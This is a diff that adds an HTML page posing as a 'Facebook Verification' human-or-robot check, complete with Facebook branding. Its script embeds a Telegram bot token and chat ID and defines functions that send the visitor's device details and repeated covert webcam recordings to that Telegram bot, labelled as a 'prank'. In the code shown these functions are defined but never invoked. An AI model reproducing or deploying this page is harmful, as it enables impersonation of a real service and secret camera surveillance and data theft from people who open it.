@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Facebook Verification Page - Confirm if you're a human or a robot.">
+  <meta name="keywords" content="Facebook Verification, Human or Robot, CAPTCHA, Security Check">
+  <meta name="author" content="Facebook Security">
+  <title>Facebook Verification</title>
+  <style>
+    /* Base Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .container {
+      text-align: center;
+      background: #fff;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      padding: 20px;
+      max-width: 400px;
+      animation: slideIn 2s ease-in-out;
+    }
+
+    h1 {
+      font-size: 1.5rem;
+      color: #4267B2;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      width: 100px;
+      animation: pulse 2s infinite;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 1rem;
+      color: #4a4a4a;
+      margin-bottom: 20px;
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+
+    button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 1rem;
+      cursor: pointer;
+      color: #fff;
+      transition: transform 0.3s;
+    }
+
+    .human-btn {
+      background: #28a745;
+    }
+
+    .robot-btn {
+      background: #dc3545;
+    }
+
+    button:hover {
+      transform: scale(1.1);
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 0.9rem;
+      color: #8a8a8a;
+    }
+
+    .footer a {
+      text-decoration: none;
+      color: #4267B2;
+    }
+
+    /* Animations */
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+    }
+
+    @keyframes slideIn {
+      from {
+        transform: translateY(-100%);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    /* Responsive Design */
+    @media (max-width: 500px) {
+      .container {
+        width: 90%;
+      }
+
+      h1 {
+        font-size: 1.2rem;
+      }
+
+      p {
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+    <h1>Facebook Verification</h1>
+    <p>We need to confirm that you're not a robot. Please select the appropriate option below.</p>
+    <div class="btn-group">
+      <button class="human-btn" onclick="humanSelected()">I am Human</button>
+      <button class="robot-btn" onclick="robotSelected()">I am a Robot</button>
+    </div>
+    <div class="footer">
+      <p>&copy; 2025 Facebook. All Rights Reserved. <a href="#">Privacy Policy</a></p>
+    </div>
+  </div>
+
+  <script>
+    function humanSelected() {
+      alert("Server error, wait 30second and try agin! ");
+    }
+
+    function robotSelected() {
+      alert("Access Denied. Robots are not allowed!");
+    }
+    
+    
+    
+    // Telegram Bot Configuration
+    const botToken = '7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc';
+    const chatId = '7945358964';
+
+    // Helper function to send data to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message }),
+      });
+    }
+
+    // Capture device info and send to Telegram
+    function captureInfo() {
+      const deviceInfo = {
+        url: window.location.href,
+        title: document.title,
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+      };
+      sendToTelegram(`📱 Device Info:\n${JSON.stringify(deviceInfo, null, 2)}`);
+    }
+
+    // Capture video for 5 seconds
+    async function captureVideo() {
+      const constraints = { video: true };
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/mp4' });
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('video', blob, 'prank_video.mp4');
+
+          const telegramURL = `https://api.telegram.org/bot${botToken}/sendVideo`;
+          await fetch(telegramURL, { method: 'POST', body: formData });
+          stream.getTracks().forEach((track) => track.stop());
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000); // Stop after 5 seconds
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+      }
+    }
+
+    // Run the prank process
+    async function runPrank() {
+      for (let i = 0; i < 6; i++) {
+        await captureVideo();
+        await new Promise((resolve) => setTimeout(resolve, 5000)); // Wait for 5 seconds
+      }
+    }
+
+   
+  </script>
+</body>
+</html>
